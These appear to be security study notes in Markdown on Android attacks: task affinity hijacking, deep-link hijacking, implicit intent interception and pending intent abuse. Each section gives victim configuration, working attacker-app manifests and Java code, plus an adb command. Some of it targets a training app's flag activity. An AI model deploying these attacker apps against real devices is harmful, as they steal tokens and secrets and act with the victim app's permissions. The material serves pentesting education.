# Content
- [Task Hijacking / Task Affinity Attack](#task-hijacking--task-affinity-attack)
- [Deep Links Hijacking](#deep-links-hijacking)
- [Hijack Implicit Intents](#hijack-implicit-intents)

# Task Hijacking / Task Affinity Attack
based on [singleTask mode](https://developer.android.com/guide/components/activities/tasks-and-back-stack#TaskLaunchModes) this gives 3 options for android os when an activity with this mode called :

- **If the Activity instance already exists:**
  - the system routes the intent to the existing instance through a call to its `onNewIntent()` method, rather than creating a new instance. Meanwhile all of the other activities on top of it are destroyed. 

- **If the Activity is newly created:**
  - The system creates the activity at the root of a new task
  - or locates the activity on an existing task with the same affinity

the affinity of an app is usually the package name, an attacker can exploit the last behavior to push the new created activity in the same stack of the hacker's activity

## Attack
### Victim App
notice the `android:launchMode="singleTask"`
```xml
<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="com.victim.app">

    <application
        android:allowBackup="true"
        android:icon="@mipmap/ic_launcher"
        android:logo="@mipmap/ic_launcher"
        android:label="@string/app_name"
        android:roundIcon="@mipmap/ic_launcher_round"
        android:supportsRtl="true"
        android:theme="@style/Theme.SuperSecureApp">
        <activity android:name=".LoggedIn"></activity>
        <activity android:name=".MainActivity" android:launchMode="singleTask">

            <intent-filter>
                <action android:name="android.intent.action.MAIN" />

                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity>
    </application>
</manifest>
```


### Atacker App
- made the `taskAffinity` with the victim package name 
- `android:excludeFromRecents` ensures the task is not listed in the recent apps, to hide the attacker's app.
```xml
<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    xmlns:tools="http://schemas.android.com/tools"
    package="com.hacker.app"
    tools:ignore="ExtraText">
    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
    <application
        android:allowBackup="true"
        android:icon="@mipmap/ic_launcher"
        android:label="@string/app_name"
        android:roundIcon="@mipmap/ic_launcher_round"
        android:supportsRtl="true"
        android:theme="@style/Theme.AttackerApp"
        android:taskAffinity="com.victim.app">
        <activity android:name=".MainActivity" android:launchMode="singleTask" android:excludeFromRecents="true">

            <intent-filter>
                <action android:name="android.intent.action.MAIN" />

                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity>
    </application>
</manifest>

```

```java
package com.hacker.app;

import androidx.appcompat.app.AppCompatActivity;

import android.content.Intent;
import android.os.Bundle;

public class MainActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        moveTaskToBack(true);
    }

    @Override
    public void onResume(){
        super.onResume();
        setContentView(R.layout.activity_main);
    }
}
```


### References
- https://blog.takemyhand.xyz/2021/02/android-task-hijacking-with.html
- https://book.hacktricks.xyz/mobile-pentesting/android-app-pentesting/android-task-hijacking
- https://blog.dixitaditya.com/android-task-hijacking?x-host=blog.dixitaditya.com

# Deep Links Hijacking 
the [deep link](https://developer.android.com/training/app-links/deep-linking) are URIs of any scheme that take users directly to a specific part of your app. 

the Android system tries each of the following actions, in sequential order, until the request succeeds:
- Open the user's preferred app that can handle the URI, if one is designated.
- Open the only available app that can handle the URI.
- Allow the user to select an app from a dialog.

if there a website using a deep link to send senstive data to it we can hijack this deeplink by creating an app using that listen to the same deeplink

## Attack
### Victim App
- AndroidMainfest
```xml
  <intent-filter>
    <action android:name="android.intent.action.VIEW"></action>
    <category android:name="android.intent.category.DEFAULT"></category>
    <category android:name="android.intent.category.BROWSABLE"></category>
    <data android:scheme="holiday" > </data>
</intent-filter>
```

### Atacker App
- java code
```java
setContentView(R.layout.activity_sniif); // Ensure the layout file name is correct
Intent intent = getIntent();
Uri uri = intent.getData();
TextView textView = findViewById(R.id.textViewHacked);
if (uri != null) {
  String uriString = uri.toString();
  textView.setText("hacked your account: "+uriString);
} else {
  textView.setText("No Uri data received");
}
```
- adb shell
```shell
am start -a android.intent.action.VIEW -d holiday://example.com?token=123456789
```

### look also for applinks and weblinks


# Hijack Implicit Intents
Hijacking implicit intents involves intercepting and handling intents meant for other apps by declaring matching intent filters in your app's manifest.

### Vicitm App
```xml
<activity
    android:name=".Auth"
    android:exported="true">
    <intent-filter>
        <action android:name="com.app.Vicitm.ATTACK_ME" />
        <category android:name="android.intent.category.DEFAULT" />
    </intent-filter>
</activity>
```


### Atacker App
```xml
<activity
    android:name=".HijackActivity"
    android:exported="true">
    <intent-filter>
        <action android:name="com.app.Vicitm.ATTACK_ME" />
        <category android:name="android.intent.category.DEFAULT" />
    </intent-filter>
</activity>
```
- HijackActivity 
```java
hijcakTextView = findViewById(R.id.hijackTextView) ;
Intent I = getIntent();
String secret = I.getStringExtra("secret") ;
hijcakTextView.setText(secret);
```

# Hijack Pending Intent
- Pending intents was introduced as away to protect against `Intent Redirect` cuz it is run in the permssion of the sender app
- but what could happen if we hijacked a pending intent, we can run intents in the permssion level of the victim app

### Victim App

```xml
        <activity
            android:name="io.hextree.attacksurface.activities.Flag23Activity"
            android:exported="false">
            <intent-filter>
                <action android:name="io.hextree.attacksurface.MUTATE_ME"/>
                <category android:name="android.intent.category.DEFAULT"/>
            </intent-filter>
        </activity>
```
- activity
```java
    protected void onCreate(Bundle bundle) {
        super.onCreate(bundle);
        this.f = new LogHelper(this);
        Intent intent = getIntent();
        String action = intent.getAction();
        if (action == null) {
            Toast.makeText(this, "Sending implicit intent with the flag\nio.hextree.attacksurface.MUTATE_ME", 1).show();
            Intent intent2 = new Intent("io.hextree.attacksurface.GIVE_FLAG");
            intent2.setClassName(getPackageName(), Flag23Activity.class.getCanonicalName());
            PendingIntent activity = PendingIntent.getActivity(getApplicationContext(), 0, intent2, 33554432); // 33554432 == FLAG_MUTABLE
            Intent intent3 = new Intent("io.hextree.attacksurface.MUTATE_ME");
            intent3.addFlags(8);
            intent3.putExtra("pending_intent", activity);
            this.f.addTag(intent3);
            Log.i("Flag22Activity", intent3.toString());
            startActivity(intent3);
            return;
        }
        if (action.equals("io.hextree.attacksurface.GIVE_FLAG")) {
            this.f.addTag(action);
            if (intent.getIntExtra("code", -1) == 42) {
                this.f.addTag(42);
                success(this);
            } else {
                Toast.makeText(this, "Condition not met for flag", 0).show();
            }
        }
    }

```
### Atacker App
we can hijack this implicit intent, and use the pending intent to access the `Flag23Activity` which is not exported

```xml
        <activity
            android:name=".HijackActivity"
            android:exported="true" >

            <intent-filter>
                <action android:name="io.hextree.attacksurface.MUTATE_ME" />
                <category android:name="android.intent.category.DEFAULT" />
            </intent-filter>
        </activity>
```
- HijackActivity
```java
PendingIntent receive = (PendingIntent) getIntent().getParcelableExtra("pending_intent");
if (receive != null){
    Intent mutableIntent = new Intent("io.hextree.attacksurface.GIVE_FLAG");
    mutableIntent.putExtra("code",42);
    try {
        receive.send(this,0,mutableIntent);
    } catch (PendingIntent.CanceledException e) {
        throw new RuntimeException(e);
    }
}
```
